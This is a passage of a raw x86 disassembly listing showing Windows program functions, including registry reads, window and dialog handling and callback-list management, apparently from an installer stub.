  4032bc:	ff 15 80 72 40 00    	call   *0x407280
  4032c2:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
  4032c6:	0f 84 e5 00 00 00    	je     0x4033b1
  4032cc:	68 10 00 20 00       	push   $0x200010
  4032d1:	ff 74 24 14          	push   0x14(%esp)
  4032d5:	e8 c4 1f 00 00       	call   0x40529e
  4032da:	6a 02                	push   $0x2
  4032dc:	ff 15 a0 70 40 00    	call   *0x4070a0
  4032e2:	68 40 91 40 00       	push   $0x409140
  4032e7:	55                   	push   %ebp
  4032e8:	e8 0c 27 00 00       	call   0x4059f9
  4032ed:	be 00 9c 42 00       	mov    $0x429c00,%esi
  4032f2:	56                   	push   %esi
  4032f3:	55                   	push   %ebp
  4032f4:	ff 15 f0 70 40 00    	call   *0x4070f0
  4032fa:	85 c0                	test   %eax,%eax
  4032fc:	74 b9                	je     0x4032b7
  4032fe:	53                   	push   %ebx
  4032ff:	55                   	push   %ebp
  403300:	ff 15 80 70 40 00    	call   *0x407080
  403306:	55                   	push   %ebp
  403307:	ff 15 74 70 40 00    	call   *0x407074
  40330d:	38 1d 00 94 42 00    	cmp    %bl,0x429400
  403313:	75 0b                	jne    0x403320
  403315:	56                   	push   %esi
  403316:	68 00 94 42 00       	push   $0x429400
  40331b:	e8 bd 26 00 00       	call   0x4059dd
  403320:	ff 74 24 1c          	push   0x1c(%esp)
  403324:	68 00 40 42 00       	push   $0x424000
  403329:	e8 af 26 00 00       	call   0x4059dd
  40332e:	6a 1a                	push   $0x1a
  403330:	66 c7 05 00 44 42 00 	movw   $0x41,0x424400
  403337:	41 00 
  403339:	5f                   	pop    %edi
  40333a:	be 30 f0 41 00       	mov    $0x41f030,%esi
  40333f:	a1 90 3e 42 00       	mov    0x423e90,%eax
  403344:	ff b0 20 01 00 00    	push   0x120(%eax)
  40334a:	56                   	push   %esi
  40334b:	e8 af 26 00 00       	call   0x4059ff
  403350:	56                   	push   %esi
  403351:	ff 15 44 71 40 00    	call   *0x407144
  403357:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
  40335b:	74 3f                	je     0x40339c
  40335d:	6a 01                	push   $0x1
  40335f:	56                   	push   %esi
  403360:	68 00 ac 42 00       	push   $0x42ac00
  403365:	ff 15 9c 70 40 00    	call   *0x40709c
  40336b:	85 c0                	test   %eax,%eax
  40336d:	74 2d                	je     0x40339c
  40336f:	53                   	push   %ebx
  403370:	56                   	push   %esi
  403371:	e8 b5 23 00 00       	call   0x40572b
  403376:	a1 90 3e 42 00       	mov    0x423e90,%eax
  40337b:	ff b0 24 01 00 00    	push   0x124(%eax)
  403381:	56                   	push   %esi
  403382:	e8 78 26 00 00       	call   0x4059ff
  403387:	56                   	push   %esi
  403388:	e8 b0 1e 00 00       	call   0x40523d
  40338d:	3b c3                	cmp    %ebx,%eax
  40338f:	74 0b                	je     0x40339c
  403391:	50                   	push   %eax
  403392:	ff 15 ec 70 40 00    	call   *0x4070ec
  403398:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  40339c:	fe 05 00 44 42 00    	incb   0x424400
  4033a2:	4f                   	dec    %edi
  4033a3:	75 9a                	jne    0x40333f
  4033a5:	53                   	push   %ebx
  4033a6:	55                   	push   %ebp
  4033a7:	e8 7f 23 00 00       	call   0x40572b
  4033ac:	e9 06 ff ff ff       	jmp    0x4032b7
  4033b1:	39 1d 14 3f 42 00    	cmp    %ebx,0x423f14
  4033b7:	74 7b                	je     0x403434
  4033b9:	6a 03                	push   $0x3
  4033bb:	e8 3f 29 00 00       	call   0x405cff
  4033c0:	6a 04                	push   $0x4
  4033c2:	8b e8                	mov    %eax,%ebp
  4033c4:	e8 36 29 00 00       	call   0x405cff
  4033c9:	6a 05                	push   $0x5
  4033cb:	8b f0                	mov    %eax,%esi
  4033cd:	e8 2d 29 00 00       	call   0x405cff
  4033d2:	3b eb                	cmp    %ebx,%ebp
  4033d4:	8b f8                	mov    %eax,%edi
  4033d6:	74 48                	je     0x403420
  4033d8:	3b f3                	cmp    %ebx,%esi
  4033da:	74 44                	je     0x403420
  4033dc:	3b fb                	cmp    %ebx,%edi
  4033de:	74 40                	je     0x403420
  4033e0:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4033e4:	50                   	push   %eax
  4033e5:	6a 28                	push   $0x28
  4033e7:	ff 15 98 70 40 00    	call   *0x407098
  4033ed:	50                   	push   %eax
  4033ee:	ff d5                	call   *%ebp
  4033f0:	85 c0                	test   %eax,%eax
  4033f2:	74 2c                	je     0x403420
  4033f4:	8d 44 24 24          	lea    0x24(%esp),%eax
  4033f8:	50                   	push   %eax
  4033f9:	68 2c 91 40 00       	push   $0x40912c
  4033fe:	53                   	push   %ebx
  4033ff:	ff d6                	call   *%esi
  403401:	53                   	push   %ebx
  403402:	53                   	push   %ebx
  403403:	8d 44 24 28          	lea    0x28(%esp),%eax
  403407:	53                   	push   %ebx
  403408:	50                   	push   %eax
  403409:	53                   	push   %ebx
  40340a:	ff 74 24 30          	push   0x30(%esp)
  40340e:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%esp)
  403415:	00 
  403416:	c7 44 24 44 02 00 00 	movl   $0x2,0x44(%esp)
  40341d:	00 
  40341e:	ff d7                	call   *%edi
  403420:	53                   	push   %ebx
  403421:	6a 02                	push   $0x2
  403423:	ff 15 24 72 40 00    	call   *0x407224
  403429:	85 c0                	test   %eax,%eax
  40342b:	75 07                	jne    0x403434
  40342d:	6a 09                	push   $0x9
  40342f:	e8 d7 df ff ff       	call   0x40140b
  403434:	a1 2c 3f 42 00       	mov    0x423f2c,%eax
  403439:	83 f8 ff             	cmp    $0xffffffff,%eax
  40343c:	74 04                	je     0x403442
  40343e:	89 44 24 18          	mov    %eax,0x18(%esp)
  403442:	ff 74 24 18          	push   0x18(%esp)
  403446:	ff 15 a0 70 40 00    	call   *0x4070a0
  40344c:	a1 14 90 40 00       	mov    0x409014,%eax
  403451:	83 f8 ff             	cmp    $0xffffffff,%eax
  403454:	74 0e                	je     0x403464
  403456:	50                   	push   %eax
  403457:	ff 15 ec 70 40 00    	call   *0x4070ec
  40345d:	83 0d 14 90 40 00 ff 	orl    $0xffffffff,0x409014
  403464:	e8 28 00 00 00       	call   0x403491
  403469:	6a 07                	push   $0x7
  40346b:	68 00 a8 42 00       	push   $0x42a800
  403470:	e8 8d 1e 00 00       	call   0x405302
  403475:	c3                   	ret
  403476:	56                   	push   %esi
  403477:	8b 35 34 f4 41 00    	mov    0x41f434,%esi
  40347d:	eb 0a                	jmp    0x403489
  40347f:	ff 74 24 08          	push   0x8(%esp)
  403483:	ff 56 04             	call   *0x4(%esi)
  403486:	8b 36                	mov    (%esi),%esi
  403488:	59                   	pop    %ecx
  403489:	85 f6                	test   %esi,%esi
  40348b:	75 f2                	jne    0x40347f
  40348d:	5e                   	pop    %esi
  40348e:	c2 04 00             	ret    $0x4
  403491:	56                   	push   %esi
  403492:	8b 35 34 f4 41 00    	mov    0x41f434,%esi
  403498:	6a 00                	push   $0x0
  40349a:	e8 d7 ff ff ff       	call   0x403476
  40349f:	85 f6                	test   %esi,%esi
  4034a1:	74 1a                	je     0x4034bd
  4034a3:	57                   	push   %edi
  4034a4:	8b fe                	mov    %esi,%edi
  4034a6:	8b 36                	mov    (%esi),%esi
  4034a8:	ff 77 08             	push   0x8(%edi)
  4034ab:	ff 15 18 71 40 00    	call   *0x407118
  4034b1:	57                   	push   %edi
  4034b2:	ff 15 fc 70 40 00    	call   *0x4070fc
  4034b8:	85 f6                	test   %esi,%esi
  4034ba:	75 e8                	jne    0x4034a4
  4034bc:	5f                   	pop    %edi
  4034bd:	83 25 34 f4 41 00 00 	andl   $0x0,0x41f434
  4034c4:	5e                   	pop    %esi
  4034c5:	c3                   	ret
  4034c6:	a1 34 f4 41 00       	mov    0x41f434,%eax
  4034cb:	eb 0b                	jmp    0x4034d8
  4034cd:	8b 48 08             	mov    0x8(%eax),%ecx
  4034d0:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  4034d4:	74 0a                	je     0x4034e0
  4034d6:	8b 00                	mov    (%eax),%eax
  4034d8:	85 c0                	test   %eax,%eax
  4034da:	75 f1                	jne    0x4034cd
  4034dc:	40                   	inc    %eax
  4034dd:	c2 04 00             	ret    $0x4
  4034e0:	33 c0                	xor    %eax,%eax
  4034e2:	eb f9                	jmp    0x4034dd
  4034e4:	56                   	push   %esi
  4034e5:	8b 74 24 08          	mov    0x8(%esp),%esi
  4034e9:	56                   	push   %esi
  4034ea:	e8 d7 ff ff ff       	call   0x4034c6
  4034ef:	85 c0                	test   %eax,%eax
  4034f1:	75 03                	jne    0x4034f6
  4034f3:	40                   	inc    %eax
  4034f4:	eb 2c                	jmp    0x403522
  4034f6:	6a 0c                	push   $0xc
  4034f8:	6a 40                	push   $0x40
  4034fa:	ff 15 00 71 40 00    	call   *0x407100
  403500:	85 c0                	test   %eax,%eax
  403502:	74 1b                	je     0x40351f
  403504:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403508:	89 70 08             	mov    %esi,0x8(%eax)
  40350b:	89 48 04             	mov    %ecx,0x4(%eax)
  40350e:	8b 0d 34 f4 41 00    	mov    0x41f434,%ecx
  403514:	89 08                	mov    %ecx,(%eax)
  403516:	a3 34 f4 41 00       	mov    %eax,0x41f434
  40351b:	33 c0                	xor    %eax,%eax
  40351d:	eb 03                	jmp    0x403522
  40351f:	83 c8 ff             	or     $0xffffffff,%eax
  403522:	5e                   	pop    %esi
  403523:	c2 08 00             	ret    $0x8
  403526:	83 ec 14             	sub    $0x14,%esp
  403529:	53                   	push   %ebx
  40352a:	55                   	push   %ebp
  40352b:	56                   	push   %esi
  40352c:	8b 35 90 3e 42 00    	mov    0x423e90,%esi
  403532:	57                   	push   %edi
  403533:	6a 06                	push   $0x6
  403535:	e8 c5 27 00 00       	call   0x405cff
  40353a:	33 db                	xor    %ebx,%ebx
  40353c:	3b c3                	cmp    %ebx,%eax
  40353e:	74 12                	je     0x403552
  403540:	ff d0                	call   *%eax
  403542:	0f b7 c0             	movzwl %ax,%eax
  403545:	50                   	push   %eax
  403546:	68 00 a0 42 00       	push   $0x42a000
  40354b:	e8 eb 23 00 00       	call   0x40593b
  403550:	eb 4a                	jmp    0x40359c
  403552:	bf 78 04 42 00       	mov    $0x420478,%edi
  403557:	53                   	push   %ebx
  403558:	57                   	push   %edi
  403559:	53                   	push   %ebx
  40355a:	68 e4 72 40 00       	push   $0x4072e4
  40355f:	68 01 00 00 80       	push   $0x80000001
  403564:	c7 05 00 a0 42 00 30 	movl   $0x7830,0x42a000
  40356b:	78 00 00 
  40356e:	e8 51 23 00 00       	call   0x4058c4
  403573:	38 1d 78 04 42 00    	cmp    %bl,0x420478
  403579:	75 16                	jne    0x403591
  40357b:	53                   	push   %ebx
  40357c:	57                   	push   %edi
  40357d:	68 02 73 40 00       	push   $0x407302
  403582:	68 bc 72 40 00       	push   $0x4072bc
  403587:	68 03 00 00 80       	push   $0x80000003
  40358c:	e8 33 23 00 00       	call   0x4058c4
  403591:	57                   	push   %edi
  403592:	68 00 a0 42 00       	push   $0x42a000
  403597:	e8 5d 24 00 00       	call   0x4059f9
  40359c:	e8 4e 02 00 00       	call   0x4037ef
  4035a1:	a1 98 3e 42 00       	mov    0x423e98,%eax
  4035a6:	bd 00 94 42 00       	mov    $0x429400,%ebp
  4035ab:	83 e0 20             	and    $0x20,%eax
  4035ae:	55                   	push   %ebp
  4035af:	a3 00 3f 42 00       	mov    %eax,0x423f00
  4035b4:	c7 05 1c 3f 42 00 00 	movl   $0x10000,0x423f1c
  4035bb:	00 01 00 
  4035be:	e8 ee 1f 00 00       	call   0x4055b1
  4035c3:	85 c0                	test   %eax,%eax
  4035c5:	0f 85 81 00 00 00    	jne    0x40364c
  4035cb:	8b 4e 48             	mov    0x48(%esi),%ecx
  4035ce:	3b cb                	cmp    %ebx,%ecx
  4035d0:	74 7a                	je     0x40364c
  4035d2:	8b 56 4c             	mov    0x4c(%esi),%edx
  4035d5:	a1 b8 3e 42 00       	mov    0x423eb8,%eax
  4035da:	bf 20 2e 42 00       	mov    $0x422e20,%edi
  4035df:	53                   	push   %ebx
  4035e0:	03 d0                	add    %eax,%edx
  4035e2:	57                   	push   %edi
  4035e3:	03 c8                	add    %eax,%ecx
  4035e5:	52                   	push   %edx
  4035e6:	51                   	push   %ecx
  4035e7:	ff 76 44             	push   0x44(%esi)
  4035ea:	e8 d5 22 00 00       	call   0x4058c4
  4035ef:	a0 20 2e 42 00       	mov    0x422e20,%al
  4035f4:	3a c3                	cmp    %bl,%al
  4035f6:	74 54                	je     0x40364c
  4035f8:	3c 22                	cmp    $0x22,%al
  4035fa:	75 0f                	jne    0x40360b
  4035fc:	bf 21 2e 42 00       	mov    $0x422e21,%edi
  403601:	6a 22                	push   $0x22
  403603:	57                   	push   %edi
  403604:	e8 f2 1e 00 00       	call   0x4054fb
  403609:	88 18                	mov    %bl,(%eax)
  40360b:	57                   	push   %edi
  40360c:	e8 e2 23 00 00       	call   0x4059f3
  403611:	8d 44 38 fc          	lea    -0x4(%eax,%edi,1),%eax
  403615:	3b c7                	cmp    %edi,%eax
  403617:	76 26                	jbe    0x40363f
  403619:	68 bc 91 40 00       	push   $0x4091bc
  40361e:	50                   	push   %eax
  40361f:	ff 15 f0 70 40 00    	call   *0x4070f0
  403625:	85 c0                	test   %eax,%eax
  403627:	75 16                	jne    0x40363f
  403629:	57                   	push   %edi
  40362a:	ff 15 78 70 40 00    	call   *0x407078
  403630:	83 f8 ff             	cmp    $0xffffffff,%eax
  403633:	74 04                	je     0x403639
  403635:	a8 10                	test   $0x10,%al
  403637:	75 06                	jne    0x40363f
  403639:	57                   	push   %edi
  40363a:	e8 d8 1e 00 00       	call   0x405517
  40363f:	57                   	push   %edi
  403640:	e8 8b 1e 00 00       	call   0x4054d0
  403645:	50                   	push   %eax
  403646:	55                   	push   %ebp
  403647:	e8 91 23 00 00       	call   0x4059dd
  40364c:	55                   	push   %ebp
  40364d:	e8 5f 1f 00 00       	call   0x4055b1
  403652:	85 c0                	test   %eax,%eax
  403654:	75 0c                	jne    0x403662
  403656:	ff b6 18 01 00 00    	push   0x118(%esi)
  40365c:	55                   	push   %ebp
  40365d:	e8 9d 23 00 00       	call   0x4059ff
  403662:	68 40 80 00 00       	push   $0x8040
  403667:	53                   	push   %ebx
  403668:	53                   	push   %ebx
  403669:	6a 01                	push   $0x1
  40366b:	6a 67                	push   $0x67
  40366d:	ff 35 80 3e 42 00    	push   0x423e80
  403673:	ff 15 34 72 40 00    	call   *0x407234
  403679:	a3 68 36 42 00       	mov    %eax,0x423668
  40367e:	83 7e 50 ff          	cmpl   $0xffffffff,0x50(%esi)
  403682:	bf 20 36 42 00       	mov    $0x423620,%edi
  403687:	0f 84 89 00 00 00    	je     0x403716
  40368d:	8b 0d 80 3e 42 00    	mov    0x423e80,%ecx
  403693:	a3 34 36 42 00       	mov    %eax,0x423634
  403698:	8d 44 24 10          	lea    0x10(%esp),%eax
  40369c:	57                   	push   %edi
  40369d:	c7 44 24 14 5f 4e 62 	movl   $0x624e5f,0x14(%esp)
  4036a4:	00 
  4036a5:	c7 05 24 36 42 00 00 	movl   $0x401000,0x423624
  4036ac:	10 40 00 
  4036af:	89 0d 30 36 42 00    	mov    %ecx,0x423630
  4036b5:	a3 44 36 42 00       	mov    %eax,0x423644
  4036ba:	ff 15 bc 71 40 00    	call   *0x4071bc
  4036c0:	66 85 c0             	test   %ax,%ax
  4036c3:	0f 84 1c 01 00 00    	je     0x4037e5
  4036c9:	8d 44 24 14          	lea    0x14(%esp),%eax
  4036cd:	53                   	push   %ebx
  4036ce:	50                   	push   %eax
  4036cf:	53                   	push   %ebx
  4036d0:	6a 30                	push   $0x30
  4036d2:	ff 15 0c 72 40 00    	call   *0x40720c
  4036d8:	53                   	push   %ebx
  4036d9:	ff 35 80 3e 42 00    	push   0x423e80
  4036df:	8b 44 24 28          	mov    0x28(%esp),%eax
  4036e3:	2b 44 24 20          	sub    0x20(%esp),%eax
  4036e7:	53                   	push   %ebx
  4036e8:	53                   	push   %ebx
  4036e9:	50                   	push   %eax
  4036ea:	8b 44 24 30          	mov    0x30(%esp),%eax
  4036ee:	2b 44 24 28          	sub    0x28(%esp),%eax
  4036f2:	50                   	push   %eax
  4036f3:	8d 44 24 28          	lea    0x28(%esp),%eax
  4036f7:	ff 74 24 30          	push   0x30(%esp)
  4036fb:	ff 74 24 30          	push   0x30(%esp)
  4036ff:	68 00 00 00 80       	push   $0x80000000
  403704:	53                   	push   %ebx
  403705:	50                   	push   %eax
  403706:	68 80 00 00 00       	push   $0x80
  40370b:	ff 15 10 72 40 00    	call   *0x407210
  403711:	a3 50 04 42 00       	mov    %eax,0x420450
  403716:	53                   	push   %ebx
  403717:	e8 ef dc ff ff       	call   0x40140b
  40371c:	85 c0                	test   %eax,%eax
  40371e:	74 08                	je     0x403728
  403720:	6a 02                	push   $0x2
  403722:	58                   	pop    %eax
  403723:	e9 bf 00 00 00       	jmp    0x4037e7
  403728:	e8 c2 00 00 00       	call   0x4037ef
  40372d:	39 1d 20 3f 42 00    	cmp    %ebx,0x423f20
  403733:	0f 85 83 00 00 00    	jne    0x4037bc
  403739:	6a 05                	push   $0x5
  40373b:	ff 35 50 04 42 00    	push   0x420450
  403741:	ff 15 60 72 40 00    	call   *0x407260
  403747:	8b 35 b4 70 40 00    	mov    0x4070b4,%esi
  40374d:	68 b0 72 40 00       	push   $0x4072b0
  403752:	ff d6                	call   *%esi
  403754:	85 c0                	test   %eax,%eax
  403756:	75 07                	jne    0x40375f
  403758:	68 a4 72 40 00       	push   $0x4072a4
  40375d:	ff d6                	call   *%esi
  40375f:	8b 35 14 72 40 00    	mov    0x407214,%esi
  403765:	bd 98 72 40 00       	mov    $0x407298,%ebp
  40376a:	57                   	push   %edi
  40376b:	55                   	push   %ebp
  40376c:	53                   	push   %ebx
  40376d:	ff d6                	call   *%esi
  40376f:	85 c0                	test   %eax,%eax
  403771:	75 16                	jne    0x403789
  403773:	57                   	push   %edi
  403774:	68 8c 72 40 00       	push   $0x40728c
  403779:	53                   	push   %ebx
  40377a:	ff d6                	call   *%esi
  40377c:	57                   	push   %edi
  40377d:	89 2d 44 36 42 00    	mov    %ebp,0x423644
  403783:	ff 15 bc 71 40 00    	call   *0x4071bc
  403789:	a1 60 36 42 00       	mov    0x423660,%eax
  40378e:	53                   	push   %ebx
  40378f:	83 c0 69             	add    $0x69,%eax
  403792:	68 bc 38 40 00       	push   $0x4038bc
  403797:	0f b7 c0             	movzwl %ax,%eax
  40379a:	53                   	push   %ebx
  40379b:	50                   	push   %eax
  40379c:	ff 35 80 3e 42 00    	push   0x423e80
  4037a2:	ff 15 18 72 40 00    	call   *0x407218
  4037a8:	6a 05                	push   $0x5
  4037aa:	8b f0                	mov    %eax,%esi
  4037ac:	e8 5a dc ff ff       	call   0x40140b
  4037b1:	6a 01                	push   $0x1
  4037b3:	e8 be fc ff ff       	call   0x403476
  4037b8:	8b c6                	mov    %esi,%eax
  4037ba:	eb 2b                	jmp    0x4037e7
  4037bc:	53                   	push   %ebx
  4037bd:	e8 8b 16 00 00       	call   0x404e4d
  4037c2:	85 c0                	test   %eax,%eax
  4037c4:	74 18                	je     0x4037de
  4037c6:	39 1d 4c 36 42 00    	cmp    %ebx,0x42364c
  4037cc:	0f 85 4e ff ff ff    	jne    0x403720
  4037d2:	6a 02                	push   $0x2
  4037d4:	e8 32 dc ff ff       	call   0x40140b
  4037d9:	e9 42 ff ff ff       	jmp    0x403720
  4037de:	6a 01                	push   $0x1
  4037e0:	e8 26 dc ff ff       	call   0x40140b
  4037e5:	33 c0                	xor    %eax,%eax
  4037e7:	5f                   	pop    %edi
  4037e8:	5e                   	pop    %esi
  4037e9:	5d                   	pop    %ebp
  4037ea:	5b                   	pop    %ebx
  4037eb:	83 c4 14             	add    $0x14,%esp
  4037ee:	c3                   	ret
  4037ef:	53                   	push   %ebx
  4037f0:	55                   	push   %ebp
  4037f1:	56                   	push   %esi
  4037f2:	57                   	push   %edi
  4037f3:	bf 00 a0 42 00       	mov    $0x42a000,%edi
  4037f8:	bb ff ff 00 00       	mov    $0xffff,%ebx
  4037fd:	57                   	push   %edi
  4037fe:	e8 51 21 00 00       	call   0x405954
  403803:	8b 35 c4 3e 42 00    	mov    0x423ec4,%esi
  403809:	85 f6                	test   %esi,%esi
  40380b:	74 45                	je     0x403852
  40380d:	8b 0d 90 3e 42 00    	mov    0x423e90,%ecx
  403813:	8b 49 64             	mov    0x64(%ecx),%ecx
  403816:	8b d1                	mov    %ecx,%edx
  403818:	0f af ce             	imul   %esi,%ecx
  40381b:	f7 da                	neg    %edx
  40381d:	03 0d c0 3e 42 00    	add    0x423ec0,%ecx
  403823:	03 ca                	add    %edx,%ecx
  403825:	4e                   	dec    %esi
  403826:	66 8b 29             	mov    (%ecx),%bp
  403829:	66 33 e8             	xor    %ax,%bp
  40382c:	23 eb                	and    %ebx,%ebp
  40382e:	66 85 ed             	test   %bp,%bp
  403831:	74 06                	je     0x403839
  403833:	85 f6                	test   %esi,%esi
  403835:	75 ec                	jne    0x403823
  403837:	eb 19                	jmp    0x403852
  403839:	8b 51 02             	mov    0x2(%ecx),%edx
  40383c:	89 15 60 36 42 00    	mov    %edx,0x423660
  403842:	8b 51 06             	mov    0x6(%ecx),%edx
  403845:	89 15 28 3f 42 00    	mov    %edx,0x423f28
  40384b:	8d 51 0a             	lea    0xa(%ecx),%edx
  40384e:	85 d2                	test   %edx,%edx
  403850:	75 12                	jne    0x403864
  403852:	66 81 fb ff ff       	cmp    $0xffff,%bx
  403857:	75 07                	jne    0x403860
  403859:	bb ff 03 00 00       	mov    $0x3ff,%ebx
  40385e:	eb a3                	jmp    0x403803
  403860:	33 db                	xor    %ebx,%ebx
  403862:	eb 9f                	jmp    0x403803
  403864:	89 15 5c 36 42 00    	mov    %edx,0x42365c
  40386a:	0f b7 01             	movzwl (%ecx),%eax
  40386d:	50                   	push   %eax
  40386e:	57                   	push   %edi
  40386f:	e8 c7 20 00 00       	call   0x40593b
  403874:	6a fe                	push   $0xfffffffe
  403876:	68 80 36 42 00       	push   $0x423680
  40387b:	e8 7f 21 00 00       	call   0x4059ff
  403880:	50                   	push   %eax
  403881:	ff 35 50 04 42 00    	push   0x420450
  403887:	ff 15 f4 71 40 00    	call   *0x4071f4
  40388d:	a1 ac 3e 42 00       	mov    0x423eac,%eax
  403892:	8b 35 a8 3e 42 00    	mov    0x423ea8,%esi
  403898:	85 c0                	test   %eax,%eax
  40389a:	74 1b                	je     0x4038b7
  40389c:	8b f8                	mov    %eax,%edi
  40389e:	8b 06                	mov    (%esi),%eax
  4038a0:	85 c0                	test   %eax,%eax
  4038a2:	74 0a                	je     0x4038ae
  4038a4:	50                   	push   %eax
  4038a5:	8d 46 18             	lea    0x18(%esi),%eax
  4038a8:	50                   	push   %eax
  4038a9:	e8 51 21 00 00       	call   0x4059ff
  4038ae:	81 c6 18 04 00 00    	add    $0x418,%esi
  4038b4:	4f                   	dec    %edi
  4038b5:	75 e7                	jne    0x40389e
  4038b7:	5f                   	pop    %edi
  4038b8:	5e                   	pop    %esi
  4038b9:	5d                   	pop    %ebp
  4038ba:	5b                   	pop    %ebx
  4038bb:	c3                   	ret
  4038bc:	83 ec 10             	sub    $0x10,%esp
  4038bf:	b9 10 01 00 00       	mov    $0x110,%ecx
  4038c4:	53                   	push   %ebx
  4038c5:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  4038c9:	55                   	push   %ebp
  4038ca:	56                   	push   %esi
  4038cb:	3b d9                	cmp    %ecx,%ebx
  4038cd:	57                   	push   %edi
  4038ce:	0f 84 3b 01 00 00    	je     0x403a0f
  4038d4:	81 fb 08 04 00 00    	cmp    $0x408,%ebx
  4038da:	0f 84 2f 01 00 00    	je     0x403a0f
  4038e0:	8b 7c 24 24          	mov    0x24(%esp),%edi
  4038e4:	33 ed                	xor    %ebp,%ebp
  4038e6:	83 fb 47             	cmp    $0x47,%ebx
  4038e9:	75 13                	jne    0x4038fe
  4038eb:	6a 13                	push   $0x13
  4038ed:	55                   	push   %ebp
  4038ee:	55                   	push   %ebp
  4038ef:	55                   	push   %ebp
  4038f0:	55                   	push   %ebp
  4038f1:	57                   	push   %edi
  4038f2:	ff 35 50 04 42 00    	push   0x420450
  4038f8:	ff 15 88 71 40 00    	call   *0x407188
  4038fe:	83 fb 05             	cmp    $0x5,%ebx
  403901:	75 18                	jne    0x40391b
  403903:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403907:	48                   	dec    %eax
  403908:	f7 d8                	neg    %eax
  40390a:	1b c0                	sbb    %eax,%eax
  40390c:	23 c3                	and    %ebx,%eax
  40390e:	50                   	push   %eax
  40390f:	ff 35 50 04 42 00    	push   0x420450
  403915:	ff 15 60 72 40 00    	call   *0x407260
  40391b:	81 fb 0d 04 00 00    	cmp    $0x40d,%ebx
  403921:	75 1a                	jne    0x40393d
  403923:	ff 35 58 36 42 00    	push   0x423658
  403929:	ff 15 e8 71 40 00    	call   *0x4071e8
  40392f:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403933:	a3 58 36 42 00       	mov    %eax,0x423658
  403938:	e9 fc 03 00 00       	jmp    0x403d39
  40393d:	83 fb 11             	cmp    $0x11,%ebx
  403940:	75 11                	jne    0x403953
  403942:	55                   	push   %ebp
  403943:	55                   	push   %ebp
  403944:	57                   	push   %edi
  403945:	ff 15 30 72 40 00    	call   *0x407230
  40394b:	33 c0                	xor    %eax,%eax
  40394d:	40                   	inc    %eax
  40394e:	e9 0b 04 00 00       	jmp    0x403d5e
  403953:	81 fb 11 01 00 00    	cmp    $0x111,%ebx
  403959:	0f 85 9d 00 00 00    	jne    0x4039fc
  40395f:	0f b7 74 24 2c       	movzwl 0x2c(%esp),%esi
  403964:	56                   	push   %esi
  403965:	57                   	push   %edi
  403966:	ff 15 2c 72 40 00    	call   *0x40722c
  40396c:	8b f8                	mov    %eax,%edi
  40396e:	3b fd                	cmp    %ebp,%edi
  403970:	74 1d                	je     0x40398f
  403972:	55                   	push   %ebp
  403973:	55                   	push   %ebp
  403974:	68 f3 00 00 00       	push   $0xf3
  403979:	57                   	push   %edi
  40397a:	ff 15 44 72 40 00    	call   *0x407244
  403980:	57                   	push   %edi
  403981:	ff 15 84 71 40 00    	call   *0x407184
  403987:	85 c0                	test   %eax,%eax
  403989:	0f 84 cd 03 00 00    	je     0x403d5c
  40398f:	83 fe 01             	cmp    $0x1,%esi
  403992:	75 03                	jne    0x403997
  403994:	56                   	push   %esi
  403995:	eb 2e                	jmp    0x4039c5
  403997:	83 fe 03             	cmp    $0x3,%esi
  40399a:	75 0c                	jne    0x4039a8
  40399c:	39 2d a4 91 40 00    	cmp    %ebp,0x4091a4
  4039a2:	7e 3f                	jle    0x4039e3
  4039a4:	6a ff                	push   $0xffffffff
  4039a6:	eb 1d                	jmp    0x4039c5
  4039a8:	6a 02                	push   $0x2
  4039aa:	5f                   	pop    %edi
  4039ab:	3b f7                	cmp    %edi,%esi
  4039ad:	75 34                	jne    0x4039e3
  4039af:	39 2d 0c 3f 42 00    	cmp    %ebp,0x423f0c
  4039b5:	74 15                	je     0x4039cc
  4039b7:	57                   	push   %edi
  4039b8:	e8 4e da ff ff       	call   0x40140b
  4039bd:	89 3d 40 f8 41 00    	mov    %edi,0x41f840
  4039c3:	6a 78                	push   $0x78
  4039c5:	e8 9e 03 00 00       	call   0x403d68
  4039ca:	eb 30                	jmp    0x4039fc
  4039cc:	6a 03                	push   $0x3
  4039ce:	e8 38 da ff ff       	call   0x40140b
  4039d3:	85 c0                	test   %eax,%eax
  4039d5:	75 25                	jne    0x4039fc
  4039d7:	c7 05 40 f8 41 00 01 	movl   $0x1,0x41f840
  4039de:	00 00 00 
  4039e1:	eb e0                	jmp    0x4039c3
  4039e3:	ff 74 24 30          	push   0x30(%esp)
  4039e7:	ff 74 24 30          	push   0x30(%esp)
  4039eb:	68 11 01 00 00       	push   $0x111
  4039f0:	ff 35 58 36 42 00    	push   0x423658
  4039f6:	ff 15 44 72 40 00    	call   *0x407244
  4039fc:	ff 74 24 30          	push   0x30(%esp)
  403a00:	ff 74 24 30          	push   0x30(%esp)
  403a04:	53                   	push   %ebx
  403a05:	e8 ec 03 00 00       	call   0x403df6
  403a0a:	e9 4f 03 00 00       	jmp    0x403d5e
  403a0f:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403a13:	8b 7c 24 24          	mov    0x24(%esp),%edi
  403a17:	3b d9                	cmp    %ecx,%ebx
  403a19:	a3 5c 04 42 00       	mov    %eax,0x42045c
  403a1e:	75 4d                	jne    0x403a6d
  403a20:	8b 35 2c 72 40 00    	mov    0x40722c,%esi
  403a26:	6a 01                	push   $0x1
  403a28:	57                   	push   %edi
  403a29:	89 3d 88 3e 42 00    	mov    %edi,0x423e88
  403a2f:	ff d6                	call   *%esi
  403a31:	6a 02                	push   $0x2
  403a33:	57                   	push   %edi
  403a34:	a3 70 04 42 00       	mov    %eax,0x420470
  403a39:	ff d6                	call   *%esi
  403a3b:	6a ff                	push   $0xffffffff
  403a3d:	6a 1c                	push   $0x1c
  403a3f:	57                   	push   %edi
  403a40:	a3 38 f4 41 00       	mov    %eax,0x41f438
  403a45:	e8 45 03 00 00       	call   0x403d8f
  403a4a:	ff 35 68 36 42 00    	push   0x423668
  403a50:	6a f2                	push   $0xfffffff2
  403a52:	57                   	push   %edi
  403a53:	ff 15 80 71 40 00    	call   *0x407180
  403a59:	6a 04                	push   $0x4
  403a5b:	e8 ab d9 ff ff       	call   0x40140b
  403a60:	a3 4c 36 42 00       	mov    %eax,0x42364c
